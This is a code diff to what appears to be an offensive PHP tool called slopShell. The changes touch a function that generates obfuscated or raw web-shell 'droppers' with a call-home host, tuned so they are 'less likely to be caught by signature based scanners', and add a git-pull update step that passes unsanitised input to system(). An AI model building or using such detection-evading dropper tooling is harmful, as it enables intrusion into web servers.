@@ -208,27 +208,28 @@ function clo($host, $repo, $uri)
 function createDropper($callHome, $duration, $obfsucate, $depth){
     echo "Starting dropper creation\n";
     $file_in = "includes/base.php";
-    $ob = "includes/droppers/dynamic/obfuscated/".bin2hex(random_bytes(rand(5,25))).".php";
-    $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
     $t = new dynamic_generator();
-    if ((int)$depth > 23) {
-        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n");
-        $depth = 23;
-    }else{
-        print("Trying randomness with {$depth}\n");
-    }
-    if (!empty($callHome) && !empty($duration) && !empty($depth)){
+    if (!empty($callHome) && !empty($duration) && !empty($depth) && !empty($obfsucate)){
         try{
-            switch (strtolower($obfsucate)){
+            switch ($obfsucate){
                 case "y":
+                    $ob = "includes/droppers/dynamic/obfuscated/".bin2hex(random_bytes(rand(5,25))).".php";
+                    if ((int)$depth > 23) {
+                        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n");
+                        $depth = 23;
+                    }else{
+                        print("Trying randomness with {$depth}\n");
+                    }
                     print("Generated dropper will be: {$ob}\n");
                     $t->begin_junk($file_in, $depth, $ob, "ob");
                     system("ls -lah includes/droppers/dynamic/obfuscated");
                     break;
-                default:
+                case "n":
+                    $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
                     print("Generated Dropper will be: {$n}\n");
                     $t->begin_junk($file_in, "0", $n, "n");
                     system("ls -lah includes/droppers/dynamic/raw");
+                    break;
             }
 
         }catch (Exception $exception){
@@ -372,8 +373,12 @@ while ($run) {
             $d_int = trim(fgets(STDIN));
             echo("Do we need to obfuscate? (y/n) ->");
             $osb = trim(fgets(STDIN));
-            echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
-            $de = trim(fgets(STDIN));
+            if (strtolower($osb) == "y") {
+                echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
+                $de = trim(fgets(STDIN));
+            }else{
+                $de = "0";
+            }
             createDropper($h_name, $d_int, $osb, $de);
             break;
         case "s":
@@ -424,7 +429,13 @@ while ($run) {
             break;
         case "u":
             system($clears);
-            echo "Will be in future editions.\n";
+//            echo "Will be in future editions.\n";
+            if (strstr(getcwd(), "slopShell") == true) {
+                system("git pull");
+            }else{
+                $homie = readline("Where is slopshell downloaded to?->");
+                system("cd {$homie} && git pull");
+            }
             break;
         case "a":
             system($clears);
